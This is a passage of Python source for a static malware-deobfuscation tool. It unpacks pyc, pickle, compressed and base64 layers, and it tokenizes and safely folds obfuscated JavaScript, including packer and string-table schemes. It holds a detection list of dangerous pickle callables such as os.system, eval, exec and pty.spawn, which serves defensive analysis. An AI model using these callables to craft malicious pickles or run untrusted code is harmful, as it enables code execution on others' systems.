            layer.notes.append(f"pyc for Python {ver}; running {sys.version_info[0]}.{sys.version_info[1]} - bytecode not "
                               "disassembled. Suggested: pycdc / decompyle3 (if installed)")
            report.next_steps.append("pycdc / decompyle3 on this version-mismatched .pyc (if installed)")
    res, why = (None, "version mismatch") if not ver_ok else _run_marshal_helper(blob)
    if res is None:
        if ver_ok:
            layer.notes.append(f"marshal helper failed: {why}")
        layer.confidence = "low"
        a, u = triage.extract_strings(blob, 4)
        layer.meta["raw_strings"] = a + u
        return
    layer.meta["marshal"] = res
    layer.meta["code_objects"] = _walk_code(res) if "name" in res else []


def _pyc_detect(layer: Layer, report: Report, opts: Options) -> list[Unwrap]:
    if "marshal" not in layer.meta and "raw_strings" not in layer.meta:
        _pyc_prepare(layer, report)
    out: list[Unwrap] = []
    for co in layer.meta.get("code_objects", []):
        for s in co.get("consts_str", []):
            if len(s) >= 64:
                bb = decode.b64_decode(s)
                if bb and decode.printable_ratio(bb) >= 0.9 and _detect_lang(bb.decode("utf-8", "replace"))[1] != "low":
                    out.append(Unwrap(bb, None, "b64", "embedded", f"{layer.id}:{co.get('firstlineno', 0)}", "medium"))
            if ({"exec", "eval"} & set(co.get("names", []))) and len(s) >= 16:
                try:
                    ast.parse(s)
                    out.append(Unwrap(s.encode(), "py", "literal", "exec", f"{layer.id}:{co.get('firstlineno', 0)}", "medium"))
                except (SyntaxError, ValueError):
                    pass
    return out


# ---------- pickle (static only)
_PICKLE_DANGER = {"os.system", "posix.system", "nt.system", "builtins.eval", "builtins.exec", "__builtin__.eval",
                  "__builtin__.exec", "builtins.getattr", "builtins.__import__", "os.popen", "pty.spawn"}
_PICKLE_STR_OPS = {"STRING", "BINSTRING", "SHORT_BINSTRING", "UNICODE", "BINUNICODE", "SHORT_BINUNICODE",
                   "BINUNICODE8", "BINBYTES", "SHORT_BINBYTES", "BINBYTES8", "BYTEARRAY8"}


def _pickle_analyze(data: bytes) -> dict:
    calls: list[tuple[str, list[str]]] = []
    strs: list[str] = []
    last_global: str | None = None
    arg_start = 0
    n = 0
    try:
        for op, arg, _pos in pickletools.genops(data):
            n += 1
            if n > MAX_FINDINGS:
                break
            if op.name == "GLOBAL" and isinstance(arg, str):
                last_global = arg.replace(" ", ".", 1)
                arg_start = len(strs)
            elif op.name == "STACK_GLOBAL" and len(strs) >= 2:
                last_global = f"{strs[-2]}.{strs[-1]}"
                arg_start = len(strs)
            elif op.name in _PICKLE_STR_OPS and arg is not None:
                strs.append(arg.decode("latin-1") if isinstance(arg, (bytes, bytearray)) else str(arg))
            elif op.name in ("REDUCE", "INST", "OBJ", "NEWOBJ") and last_global:
                calls.append((last_global, strs[arg_start:]))
    except (ValueError, struct.error, IndexError, KeyError) as exc:
        return {"calls": calls, "strings": strs, "error": str(exc)[:80]}
    return {"calls": calls, "strings": strs}


def _pickle_listing(data: bytes) -> str:
    buf = io.StringIO()
    try:
        pickletools.dis(data, buf)
    except Exception as exc:  # noqa: BLE001
        buf.write(f"<dis stopped: {exc}>")
    return "\n".join(buf.getvalue().splitlines()[:400])


# ---------- whole-blob decoders
def _blob_detect(layer: Layer, report: Report, opts: Options) -> list[Unwrap]:
    d = layer.data
    loc = f"{layer.id}:1"
    if _is_pickle(d):
        info = _pickle_analyze(d)
        layer.meta["pickle"] = info
        out: list[Unwrap] = []
        for cal, args in info["calls"]:
            if cal in _PICKLE_DANGER or cal.startswith("subprocess."):
                shown = f"{cal}({', '.join(repr(a) for a in args[-2:])})"
                _add_tell(report, "T-PICKLE-REDUCE", loc, "pickle calls a callable on load", shown)
                if args:
                    lang = "py" if cal.endswith(("exec", "eval")) else "sh"
                    out.append(Unwrap(args[-1].encode("utf-8", "replace"), lang, "literal", "pickle", loc))
        return out
    steps: list[tuple[str, Callable[[], bytes]]] = []
    if d[:2] == b"\x1f\x8b":
        steps.append(("gzip", lambda: transform("gzip", d)))
    if _is_zlib_hdr(d):
        steps.append(("zlib", lambda: transform("zlib", d)))
    if d[:3] == b"BZh":
        steps.append(("bz2", lambda: transform("bz2", d)))
    if d[:6] == b"\xfd7zXZ\x00":
        steps.append(("xz", lambda: transform("xz", d)))
    if _pyc_magic_ok(d):
        return [Unwrap(d, "pyc", "pyc", "whole-file", loc)]
    s = d.strip()
    if 32 <= len(s) <= MAX_LAYER_OUT and not re.search(rb"\s", s) and len(s) < 4 * MAX_SCRIPT:
        txt = s.decode("latin-1")
        steps.append(("b64", lambda: _chk(transform("b64", txt))))
        steps.append(("hex", lambda: _chk(transform("hex", txt))))
        steps.append(("reverse -> b64", lambda: _chk(transform("b64", txt[::-1]))))
    for kind, fn in steps:
        try:
            out_b = fn()
        except TransformError:
            continue
        if out_b:
            return [Unwrap(out_b, None, kind, "whole-file", loc, "high")]
    if 32 <= len(s) <= 200000 and not re.search(rb"\s", s):
        try:
            res, chain = decode.auto_decode(s.decode("latin-1"), max_rounds=4)
        except Exception:  # noqa: BLE001
            return []
        if chain and (decode.plaintext_like(res) or _known_magic(res)):
            return [Unwrap(res, None, " -> ".join(chain), "whole-file", loc, "medium")]
    return []


def _known_magic(b: bytes) -> bool:
    return b[:4] == b"\x7fELF" or b[:2] in (b"MZ", b"\x1f\x8b") or b[:3] == b"BZh" or _is_zlib_hdr(b) or _pyc_magic_ok(b)


def _chk(b: bytes) -> bytes:
    if decode.printable_ratio(b) >= 0.85 or _known_magic(b):
        return b
    raise TransformError("not plausible")


# ---------- layer engine
def _make_layer(report: Report, lid: str, parent: str | None, depth: int, lang: str | None, kind: str, via: str,
                src_loc: str | None, data: bytes, conf: str, notes: list[str]) -> Layer:
    if lang in ("elf", "pe"):
        text = None
    elif lang is None or lang in ("py", "js", "sh", "ps1", "html", "text", "blob", "data"):
        if data[:4] == b"\x7fELF":
            lang, text = "elf", None
        elif data[:2] == b"MZ" and lang in (None, "blob", "data"):
            lang, text = "pe", None
        elif _pyc_magic_ok(data):
            lang, text = "pyc", None
        elif (data[:2] == b"\x1f\x8b" or _is_zlib_hdr(data) or data[:3] == b"BZh" or _is_pickle(data)) and lang in (None, "blob"):
            lang, text = "blob", None
        else:
            raw = data[:MAX_SCRIPT]
            if lang in (None, "blob", "data") and decode.printable_ratio(raw[:65536]) < 0.7:
                lang, text = "blob" if lang is None else lang, None
            else:
                text = _decode_text(raw)
                if lang is None:
                    lang = _detect_lang(text)[0]
    else:
        text = None
    notes = list(notes)
    if text is not None and len(data) > MAX_SCRIPT:
        notes.append("text larger than 8 MiB; analysed the first 8 MiB")
    return Layer(lid, parent, depth, lang or "data", kind, via, src_loc, data, text, None,
                 hashlib.sha256(data).hexdigest(), conf, notes, {})


def _detectors() -> dict[str, Callable]:
    return {"py": _py_detect, "pyc": _pyc_detect, "js": _js_detect, "html": _html_detect, "sh": _sh_detect,
            "ps1": _ps1_detect, "blob": _blob_detect, "data": _blob_detect, "text": _text_detect}


def _text_detect(layer: Layer, report: Report, opts: Options) -> list[Unwrap]:
    if layer.text and len(layer.text.strip()) >= 32 and not re.search(r"\s", layer.text.strip()):
        return _blob_detect(layer, report, opts)
    return []


def unwrap_layers(data: bytes, lang: str, opts: Options, report: Report) -> list[Layer]:
    """Peel obfuscation layers breadth-first using pure transforms only; returns the layer tree."""
    layers: list[Layer] = []
    dets = _detectors()
    l0 = _make_layer(report, "L0", None, 0, lang, "input", "-", None, data, "high", [])
    layers.append(l0)
    report.layers = layers
    seen = {l0.sha256}
    total = len(data)
    queue = [l0]
    max_depth = max(0, min(opts.max_depth, HARD_DEPTH))
    while queue and len(layers) < MAX_LAYERS and max_depth > 0:
        cur = queue.pop(0)
        det = dets.get(cur.lang)
        if det is None:
            continue
        if cur.depth >= max_depth:
            report.notes.append(f"depth cap reached at {cur.id}")
            _add_tell(report, "T-DEPTH-CAP", f"{cur.id}:1", "unwrap depth cap reached", f"max depth {max_depth}")
            continue
        _TRUNC[0] = False
        cands = _stage(report, f"detect-{cur.id}", det, cur, report, opts) or []
        if _TRUNC[0]:
            report.notes.append(f"{cur.id}: output truncated at 16 MiB cap")
            _add_tell(report, "T-SIZE-CAP", f"{cur.id}:1", "decompression output capped", "16 MiB cap", "high")
            _TRUNC[0] = False
        for cand in cands:
            if len(layers) >= MAX_LAYERS:
                report.notes.append("layer cap reached")
                break
            if total + len(cand.data) > MAX_TOTAL_OUT:
                report.notes.append("total output cap reached")
                break
            h = hashlib.sha256(cand.data).hexdigest()
            if h in seen:
                report.notes.append(f"{cur.id}: payload identical to an earlier layer (cycle)")
                continue
            child = _make_layer(report, f"L{len(layers)}", cur.id, cur.depth + 1, cand.lang, cand.kind, cand.via,
                                cand.src_loc, cand.data, cand.confidence, cand.notes)
            if len(cand.data) >= MAX_LAYER_OUT:
                child.notes.append("output truncated at 16 MiB cap")
            total += len(cand.data)
            layers.append(child)
            queue.append(child)
            seen.add(h)
    return layers


# ---------- JavaScript: tokenizer
Tok = collections.namedtuple("Tok", "kind value start line col")
_JS_PUNCT = [">>>=", "===", "!==", ">>>", "<<=", ">>=", "**=", "...", "=>", "==", "!=", "<=", ">=", "&&", "||", "??",
             "++", "--", "+=", "-=", "*=", "/=", "%=", "&=", "|=", "^=", "<<", ">>", "**", "?."]
_JS_KW_REGEX = {"return", "typeof", "instanceof", "in", "of", "new", "delete", "void", "throw", "case", "do", "else"}
_JS_NUM_RE = re.compile(r"0[xX][0-9a-fA-F]+|0[bB][01]+|(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?")
_JS_ID_RE = re.compile(r"[A-Za-z_$ -￿][\w$ -￿]*")
_JS_ESC = {"n": "\n", "t": "\t", "r": "\r", "b": "\b", "f": "\f", "v": "\v", "0": "\0"}


def _js_unescape_str(s: str) -> str:
    out: list[str] = []
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if c != "\\" or i + 1 >= n:
            out.append(c)
            i += 1
            continue
        d = s[i + 1]
        if d == "x" and re.fullmatch(r"[0-9a-fA-F]{2}", s[i + 2:i + 4]):
            out.append(chr(int(s[i + 2:i + 4], 16)))
            i += 4
        elif d == "u" and s[i + 2:i + 3] == "{":
            j = s.find("}", i)
            try:
                out.append(chr(int(s[i + 3:j], 16)))
                i = j + 1
            except (ValueError, OverflowError):
                out.append("u")
                i += 2
        elif d == "u" and re.fullmatch(r"[0-9a-fA-F]{4}", s[i + 2:i + 6]):
            out.append(chr(int(s[i + 2:i + 6], 16)))
            i += 6
        elif d in "01234567":
            m = re.match(r"[0-7]{1,3}", s[i + 1:])
            v = int(m.group(), 8)
            if v > 255:
                v = int(m.group()[:2], 8)
                i += 3
            else:
                i += 1 + len(m.group())
            out.append(chr(v))
        elif d == "\n":
            i += 2
        elif d == "\r":
            i += 3 if s[i + 2:i + 3] == "\n" else 2
        else:
            out.append(_JS_ESC.get(d, d))
            i += 2
    return "".join(out)


def js_tokenize(text: str, notes: list[str] | None = None) -> list[Tok]:
    """Tokenise JavaScript (strings with escapes, templates, regex-vs-division, comments dropped)."""
    toks: list[Tok] = []
    i, n, line, ls = 0, len(text), 1, 0
    prev: Tok | None = None
    while i < n and len(toks) < 2_000_000:
        c = text[i]
        if c == "\n":
            line += 1
            ls = i + 1
            i += 1
            continue
        if c in " \t\r\f\v ﻿":
            i += 1
            continue
        if text.startswith("//", i):
            j = text.find("\n", i)
            i = n if j < 0 else j
            continue
        if text.startswith("/*", i):
            j = text.find("*/", i + 2)
            if j < 0:
                if notes is not None:
                    notes.append("js: unterminated comment")
                j = n - 2
            line += text.count("\n", i, j + 2)
            if "\n" in text[i:j + 2]:
                ls = text.rfind("\n", i, j + 2) + 1
            i = j + 2
            continue
        col = i - ls + 1
        if c in "'\"":
            j = i + 1
            while j < n and text[j] != c and text[j] != "\n":
                j += 2 if text[j] == "\\" else 1
            if j >= n or text[j] != c:
                if notes is not None:
                    notes.append("js: unterminated string")
                j = min(j, n)
                val = _js_unescape_str(text[i + 1:j])
            else:
                val = _js_unescape_str(text[i + 1:j])
                j += 1
            tk = Tok("str", val, i, line, col)
            line += text.count("\n", i, j)
            i = j
        elif c == "`":
            j = i + 1
            while j < n and text[j] != "`":
                j += 2 if text[j] == "\\" else 1
            raw = text[i + 1:j]
            tk = Tok("tmpl", None if "${" in raw else _js_unescape_str(raw), i, line, col)
            line += text.count("\n", i, j)
            i = min(j + 1, n)
        elif c.isdigit() or (c == "." and text[i + 1:i + 2].isdigit()):
            m = _JS_NUM_RE.match(text, i)
            s = m.group()
            try:
                v: Any = int(s, 0) if s[:2].lower() in ("0x", "0b") else (int(s) if s.isdigit() else float(s))
            except ValueError:
                v = 0
            tk = Tok("num", v, i, line, col)
            i = m.end()
        elif _JS_ID_RE.match(text, i):
            m = _JS_ID_RE.match(text, i)
            tk = Tok("ident", m.group(), i, line, col)
            i = m.end()
        elif c == "/" and (prev is None or not (
                (prev.kind == "ident" and prev.value not in _JS_KW_REGEX) or prev.kind in ("num", "str", "tmpl", "regex")
                or (prev.kind == "punct" and prev.value in (")", "]", "}")))):
            j, incls = i + 1, False
            while j < n and text[j] != "\n":
                if text[j] == "\\":
                    j += 2
                    continue
                if text[j] == "[":
                    incls = True
                elif text[j] == "]":
                    incls = False
                elif text[j] == "/" and not incls:
                    break
                j += 1
            pat = text[i + 1:j]
            j += 1
            k = j
            while k < n and text[k].isalpha():
                k += 1
            tk = Tok("regex", (pat, text[j:k]), i, line, col)
            i = k
        else:
            p = next((q for q in _JS_PUNCT if text.startswith(q, i)), c)
            tk = Tok("punct", p, i, line, col)
            i += len(p)
        toks.append(tk)
        prev = tk
    return toks


def _js_match(toks: list[Tok], i: int) -> int:
    """Index of the token closing the bracket at toks[i], or len(toks)-1."""
    pairs = {"(": ")", "[": "]", "{": "}"}
    open_, close = toks[i].value, pairs[toks[i].value]
    d = 0
    for j in range(i, len(toks)):
        if toks[j].kind == "punct":
            if toks[j].value == open_:
                d += 1
            elif toks[j].value == close:
                d -= 1
                if d == 0:
                    return j
    return len(toks) - 1


# ---------- JavaScript: folder
class _JsFail(Exception):
    pass


@dataclass
class JsCb:
    src: str


_JS_GLOBALS = {"atob", "btoa", "unescape", "escape", "decodeURIComponent", "decodeURI", "parseInt", "Number",
               "String", "Buffer"}
_JS_NS = {"window", "globalThis", "self", "this"}


class JsFolder:
    """Recursive-descent expression folder over JS tokens (whitelisted functions only)."""

    def __init__(self, toks: list[Tok], env: dict[str, Any] | None = None) -> None:
        self.t = toks
        self.p = 0
        self.env = env if env is not None else {}
        self.unstable: set[str] = set()
        self.budget = FOLD_BUDGET

    def _is(self, v: str) -> bool:
        return self.p < len(self.t) and self.t[self.p].kind == "punct" and self.t[self.p].value == v

    def fold_at(self, p: int) -> tuple[Any, int]:
        """Fold the expression starting at token ``p``; returns (value, next_p). Never raises."""
        self.p = p
        try:
            v = self.expr()
        except (_JsFail, IndexError, RecursionError, TransformError, ValueError, TypeError, UnicodeError, OverflowError):
            return UNKNOWN, p
        return v, self.p

    def args_at(self, p: int) -> tuple[list[Any], int]:
        """Fold the call arguments starting at ``(`` token ``p``; returns (values, index after ')')."""
        if p >= len(self.t) or not (self.t[p].kind == "punct" and self.t[p].value == "("):
            return [], p
        end = _js_match(self.t, p)
        self.p = p + 1
        vals: list[Any] = []
        try:
            while self.p < end:
                vals.append(self.expr())
                if self._is(","):
                    self.p += 1
                else:
                    break
            if self.p != end:
                raise _JsFail
        except (_JsFail, IndexError, RecursionError, TransformError, ValueError, TypeError, UnicodeError, OverflowError):
            return [UNKNOWN], end + 1
        return vals, end + 1

    def expr(self) -> Any:
        v = self.term()
        while self._is("+"):
            self.p += 1
            r = self.term()
            v = self._add(v, r)
        return v

    @staticmethod
    def _add(a: Any, b: Any) -> Any:
        if a is UNKNOWN or b is UNKNOWN:
            return UNKNOWN
        if isinstance(a, str) or isinstance(b, str):
            if isinstance(a, (str, int, float)) and isinstance(b, (str, int, float)):
                ch = _chain(a) + tuple(c for c in _chain(b) if c not in _chain(a))
                return _wrap(f"{a}{b}", ch)
            return UNKNOWN
        if isinstance(a, (int, float)) and isinstance(b, (int, float)):
            return a + b
        if isinstance(a, list) and isinstance(b, list):
            return a + b
        return UNKNOWN

    def term(self) -> Any:
        self.budget -= 1
        if self.budget < 0:
            raise _JsFail
        v = self.primary()
        while self.p < len(self.t):
            tk = self.t[self.p]
            if tk.kind != "punct":
                break
            if tk.value in (".", "?."):
                self.p += 1
                if self.p >= len(self.t) or self.t[self.p].kind != "ident":
                    raise _JsFail
                v = self._attr(v, self.t[self.p].value)
                self.p += 1
            elif tk.value == "[":
                self.p += 1
                idx = self.expr()
                if not self._is("]"):
                    raise _JsFail
                self.p += 1
                v = self._index(v, idx)
            elif tk.value == "(":
                end = _js_match(self.t, self.p)
                args, nxt = self.args_at(self.p)
                self.p = nxt
                v = self._call(v, args) if v is not UNKNOWN and not any(a is UNKNOWN for a in args) else UNKNOWN
            else:
                break
        return v

    def _callback(self) -> JsCb:
        start = self.p
        d = 0
        while self.p < len(self.t):
            tk = self.t[self.p]
            if tk.kind == "punct" and tk.value in "([{":
                d += 1
            elif tk.kind == "punct" and tk.value in ")]}":
                if d == 0:
                    break
                d -= 1
            elif tk.kind == "punct" and tk.value == "," and d == 0:
                break
            self.p += 1
        return JsCb("".join(str(x.value) if x.kind != "str" else repr(x.value) for x in self.t[start:self.p]))

    def primary(self) -> Any:
        if self.p >= len(self.t):
            raise _JsFail
        tk = self.t[self.p]
        if tk.kind == "str":
            self.p += 1
            return tk.value
        if tk.kind == "tmpl":
            self.p += 1
            return UNKNOWN if tk.value is None else tk.value
        if tk.kind == "num":
            self.p += 1
            return tk.value
        if tk.kind == "regex":
            self.p += 1
            return ("regex", tk.value[0], tk.value[1])
        if tk.kind == "punct" and tk.value == "(":
            end = _js_match(self.t, self.p)
            if end + 1 < len(self.t) and self.t[end + 1].value == "=>":
                return self._callback()
            self.p += 1
            v = self.expr()
            if self._is(","):  # (0, eval) comma expression -> last value
                while self._is(","):
                    self.p += 1
                    v = self.expr()
            if not self._is(")"):
                raise _JsFail
            self.p += 1
            return v
        if tk.kind == "punct" and tk.value == "[":
            self.p += 1
            items: list[Any] = []
            while not self._is("]"):
                items.append(self.expr())
                if self._is(","):
                    self.p += 1
                elif not self._is("]"):
                    raise _JsFail
            self.p += 1
            return UNKNOWN if any(i is UNKNOWN for i in items) else items
        if tk.kind == "ident":
            name = tk.value
            if name == "new":
                self.p += 1
                return self.primary()
            if name == "function":
                return self._callback_fn()
            if self.p + 1 < len(self.t) and self.t[self.p + 1].value == "=>":
                return self._callback()
            self.p += 1
            if name in ("true", "false"):
                return name == "true"
            if name in ("null", "undefined"):
                return None
            if name in _JS_NS:
                return FuncRef("js.ns")
            if name in _JS_GLOBALS:
                return FuncRef(("String" if name in ("String", "Buffer") else "js." + name))
            if name in self.env and name not in self.unstable:
                return self.env[name]
            return UNKNOWN
        raise _JsFail

    def _callback_fn(self) -> JsCb:
        start = self.p
        self.p += 1
        while self.p < len(self.t) and not self._is("("):
            self.p += 1
        self.p = _js_match(self.t, self.p) + 1
        if not self._is("{"):
            raise _JsFail
        self.p = _js_match(self.t, self.p) + 1
        return JsCb("".join(str(x.value) if x.kind != "str" else repr(x.value) for x in self.t[start:self.p]))

    def _attr(self, base: Any, name: str) -> Any:
        if base is UNKNOWN:
            return UNKNOWN
        if isinstance(base, FuncRef):
            if base.name == "js.ns":
                return FuncRef("js." + name) if name in _JS_GLOBALS else UNKNOWN
            if base.name == "String":
                return FuncRef("String." + name) if name in ("fromCharCode", "from") else (
                    FuncRef("Buffer." + name) if name == "from" else UNKNOWN)
            if base.name == "Buffer":
                return FuncRef("Buffer." + name)
            if base.name == "String.fromCharCode" and name == "apply":
                return FuncRef("String.fromCharCode.apply")
            return UNKNOWN
        if isinstance(base, (str, bytes, list)):
            return FuncRef("method:" + name, base)
        return UNKNOWN

    def _index(self, base: Any, idx: Any) -> Any:
        if isinstance(base, (str, list)) and isinstance(idx, int) and 0 <= idx < len(base):
            return base[idx]
        if isinstance(base, FuncRef) and base.name == "js.ns" and isinstance(idx, str):
            return FuncRef("js." + idx) if idx in _JS_GLOBALS else UNKNOWN
        return UNKNOWN

    def _call(self, f: Any, a: list) -> Any:
        if not isinstance(f, FuncRef):
            return UNKNOWN
        n = f.name
        if n == "js.atob" and a and isinstance(a[0], str):
            return _wrap(transform("b64", a[0]).decode("latin-1"), _chain(a[0]) + ("b64",))
        if n == "js.btoa" and a and isinstance(a[0], str):
            return _wrap(base64.b64encode(a[0].encode("latin-1", "replace")).decode(), _chain(a[0]) + ("enc",))
        if n == "js.unescape" and a and isinstance(a[0], str):
            return _wrap(transform("js-unescape", a[0]).decode("utf-8", "replace") if "%u" in a[0] else
                         urllib.parse.unquote(a[0], encoding="latin-1"), _chain(a[0]) + ("url",))
        if n in ("js.decodeURIComponent", "js.decodeURI") and a and isinstance(a[0], str):
            return _wrap(urllib.parse.unquote(a[0]), _chain(a[0]) + ("url",))
        if n == "String.fromCharCode" and all(isinstance(x, int) for x in a):
            return "".join(chr(x & 0xFFFF) for x in a)
        if n == "String.fromCharCode.apply" and len(a) == 2 and isinstance(a[1], list) and all(isinstance(x, int) for x in a[1]):
            return "".join(chr(x & 0xFFFF) for x in a[1])
        if n == "Buffer.from" and a and isinstance(a[0], str):
            enc = a[1] if len(a) > 1 and isinstance(a[1], str) else "utf8"
            if enc == "base64":
                return _wrap(transform("b64", a[0]), _chain(a[0]) + ("b64",))
            if enc == "hex":
                return _wrap(transform("hex", a[0]), _chain(a[0]) + ("hex",))
            if enc in ("utf8", "utf-8"):
                return _wrap(a[0].encode(), _chain(a[0]))
            if enc in ("binary", "latin1"):
                return _wrap(a[0].encode("latin-1", "replace"), _chain(a[0]))
            return UNKNOWN
        if n == "js.parseInt" and a and isinstance(a[0], (str, int)):
            m = re.match(r"\s*[-+]?(0[xX])?[0-9a-zA-Z]+", str(a[0]))
            return int(m.group().strip(), a[1] if len(a) > 1 and isinstance(a[1], int) else 0 if m.group(1) else 10) if m else UNKNOWN
        if n == "js.Number" and a and isinstance(a[0], (str, int, float)):
            return float(a[0]) if "." in str(a[0]) else int(str(a[0]), 0)
        if n.startswith("method:"):
            return self._method(n[7:], f.bound, a)
        return UNKNOWN

    def _method(self, m: str, o: Any, a: list) -> Any:
        ch = _chain(o)
        if isinstance(o, bytes) and m == "toString":
            enc = a[0] if a and isinstance(a[0], str) else "utf8"
            return _wrap(o.decode("latin-1" if enc in ("binary", "latin1") else "utf-8", "replace"), ch)
        if isinstance(o, str):
            if m == "split" and a and isinstance(a[0], str):
                return o.split(a[0]) if a[0] else list(o)
            if m == "replace" and len(a) == 2 and isinstance(a[1], str):
                if isinstance(a[0], str):
                    return _wrap(o.replace(a[0], a[1], 1), ch)
                if isinstance(a[0], tuple) and a[0][0] == "regex" and not re.search(r"[.*+?^${}()|\[\]]", re.sub(r"\\.", "", a[0][1])):
                    lit = re.sub(r"\\(.)", r"\1", a[0][1])
                    return _wrap(o.replace(lit, a[1]) if "g" in a[0][2] else o.replace(lit, a[1], 1), ch)
            if m in ("slice", "substring") and a and all(isinstance(x, int) for x in a):
                return _wrap(o[slice(*a[:2])], ch)
            if m == "substr" and a and isinstance(a[0], int):
                s = a[0] if a[0] >= 0 else max(0, len(o) + a[0])
                return _wrap(o[s:s + a[1]] if len(a) > 1 and isinstance(a[1], int) else o[s:], ch)
            if m == "concat" and all(isinstance(x, str) for x in a):
                return _wrap(o + "".join(a), ch)
            if m == "charAt" and a and isinstance(a[0], int):
                return o[a[0]] if 0 <= a[0] < len(o) else ""
            if m == "toLowerCase":
                return _wrap(o.lower(), ch)
            if m == "toUpperCase":
                return _wrap(o.upper(), ch)
            if m == "trim":
                return _wrap(o.strip(), ch)
            if m == "toString":
                return o
        if isinstance(o, list):
            if m == "reverse":
                return o[::-1]
            if m == "join":
                sep = a[0] if a and isinstance(a[0], str) else ","
                if all(isinstance(x, (str, int)) for x in o):
                    return _wrap(sep.join(str(x) for x in o), ("reverse",) if False else ())
            if m == "map" and a and len(o) <= MAX_ITER:
                return self._map(o, a[0])
        return UNKNOWN

    @staticmethod
    def _map(lst: list, cb: Any) -> Any:
        if isinstance(cb, FuncRef) and cb.name == "String.fromCharCode":
            return [chr(x & 0xFFFF) for x in lst] if all(isinstance(x, int) for x in lst) else UNKNOWN
        if isinstance(cb, JsCb):
            m = re.match(r"^(?:\(?(\w+)\)?=>|function\((\w+)\)\{return)String\.fromCharCode\((\w+)(?:([\^+\-])(0x[0-9a-fA-F]+|\d+))?\)\}?$", cb.src)
            if m and (m.group(1) or m.group(2)) == m.group(3) and all(isinstance(x, int) for x in lst):
                op, k = m.group(4), int(m.group(5), 0) if m.group(5) else 0
                f = {None: lambda x: x, "^": lambda x: x ^ k, "+": lambda x: x + k, "-": lambda x: x - k}[op]
                return [chr(f(x) & 0xFFFF) for x in lst]
        return UNKNOWN


def _js_env(toks: list[Tok], fold: JsFolder) -> None:
    """Bind top-level ``var|let|const NAME = expr;`` single assignments; flag reassigned names unstable."""
    assigns: collections.Counter = collections.Counter()
    for i, tk in enumerate(toks):
        if tk.kind == "ident" and i + 1 < len(toks) and toks[i + 1].kind == "punct" and toks[i + 1].value in (
                "=", "+=", "-=", "*=", "^=", "|=", "&=", "++", "--") and not (i > 0 and toks[i - 1].value == "."):
            decl = i > 0 and toks[i - 1].kind == "ident" and toks[i - 1].value in ("var", "let", "const")
            assigns[tk.value] += 1 if decl else 2
    depth = 0
    i = 0
    while i < len(toks):
        tk = toks[i]
        if tk.kind == "punct" and tk.value in "{([":
            depth += 1
        elif tk.kind == "punct" and tk.value in "})]":
            depth -= 1
        elif depth == 0 and tk.kind == "ident" and tk.value in ("var", "let", "const") and i + 3 < len(toks) \
                and toks[i + 1].kind == "ident" and toks[i + 2].value == "=":
            nm = toks[i + 1].value
            if assigns[nm] == 1:
                v, nxt = fold.fold_at(i + 3)
                if v is not UNKNOWN:
                    fold.env[nm] = v
            else:
                fold.unstable.add(nm)
        i += 1
    for nm, c in assigns.items():
        if c > 1:
            fold.unstable.add(nm)


# ---------- JavaScript: packer, string table, detect-only encodings
_ALPH62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
_ALPH95 = "".join(chr(i) for i in range(32, 127))


def _unbase(word: str, a: int) -> int | None:
    try:
        if a <= 36:
            return int(word, a)
        alph = _ALPH62 if a <= 62 else (_ALPH95 if a <= 95 else None)
        if alph is None:
            return None
        v = 0
        for ch in word:
            d = alph.index(ch)
            v = v * a + d
        return v
    except ValueError:
        return None


def _packer_unpack(p: str, a: int, c: int, k: list[str]) -> str:
    def rep(m: re.Match) -> str:
        i = _unbase(m.group(), a)
        return k[i] if i is not None and i < len(k) and k[i] else m.group()
    return re.sub(r"\b\w+\b", rep, p)


def _js_packer(layer: Layer, toks: list[Tok], report: Report) -> list[Unwrap]:
    out: list[Unwrap] = []
    text = layer.text or ""
    for m in re.finditer(r"eval\(function\(p,a,c,k,e,[rd]\)", text):
        idx = next((i for i, t in enumerate(toks) if t.start >= m.start() + 5 and t.kind == "ident" and t.value == "function"), None)
        if idx is None:
            continue
        j = idx + 1
        while j < len(toks) and toks[j].value != "{":
            j += 1
        if j >= len(toks):
            continue
        j = _js_match(toks, j) + 1
        if j >= len(toks) or toks[j].value != "(":
            continue
        end = _js_match(toks, j)
        seg = toks[j + 1:end]
        try:
            if seg[0].kind != "str" or seg[1].value != "," or seg[2].kind != "num" or seg[4].kind != "num" \
                    or seg[6].kind != "str" or seg[7].value != "." or seg[8].value != "split":
                continue
            p, a, c, k = seg[0].value, int(seg[2].value), int(seg[4].value), seg[6].value
            sep = seg[10].value
        except (IndexError, TypeError, ValueError):
            continue
        words = k.split(sep if isinstance(sep, str) and sep else "|")
        notes = [] if c == len(words) else [f"packer: c={c} != len(k)={len(words)}"]
        res = _packer_unpack(p, a, c, words)
        loc = f"{layer.id}:{toks[idx].line}"
        _add_tell(report, "T-JS-PACKED", loc, "Dean Edwards p,a,c,k,e,d packer", f"base {a}, {len(words)} words", "medium")
        _add_tell(report, "T-DECODE-EXEC", loc, "packed payload passed to eval", f"packer(a={a}) -> eval", "high")
        out.append(Unwrap(res.encode("utf-8"), "js", f"packer(a={a})", "eval-packer", loc, "medium" if notes else "high", notes))
    return out


def _js_string_table(layer: Layer, toks: list[Tok], report: Report) -> list[Unwrap]:
    idents = {t.value for t in toks if t.kind == "ident"}
    if len(idents) < 8 or sum(bool(re.fullmatch(r"_0x[0-9a-f]{4,6}", i)) for i in idents) / len(idents) < 0.30:
        return []
    best: list[str] = []
    for i, t in enumerate(toks):
        if t.kind == "punct" and t.value == "[":
            end = _js_match(toks, i)
            els = toks[i + 1:end]
            strs = [e.value for e in els if e.kind == "str"]
            if len(strs) >= 10 and len(strs) >= 0.9 * (len(els) + 1) / 2 and len(strs) > len(best):
                best = strs
    if len(best) < 10:
        return []
    text = layer.text or ""
    loc = f"{layer.id}:1"
    if re.search(r"%\s*(?:0x100|256)", text) and re.search(r"function\s+_0x\w+\s*\(\s*\w+\s*,\s*\w+\s*\)", text):
        _add_tell(report, "T-JS-STRING-TABLE-RC4", loc, "string table with RC4-style decoder",
                  "not statically resolvable; inspect manually", "medium")
        entries = best
    else:
        entries = best
        alph = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/="
        if sum(bool(re.fullmatch(r"[a-zA-Z0-9+/=]+", s)) for s in best) >= 0.7 * len(best):
            tr = str.maketrans(alph, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
            dec = []
            for s in best:
                try:
                    b = decode.b64_decode(s.translate(tr))
                    dec.append(urllib.parse.unquote(b.decode("latin-1")) if b else s)
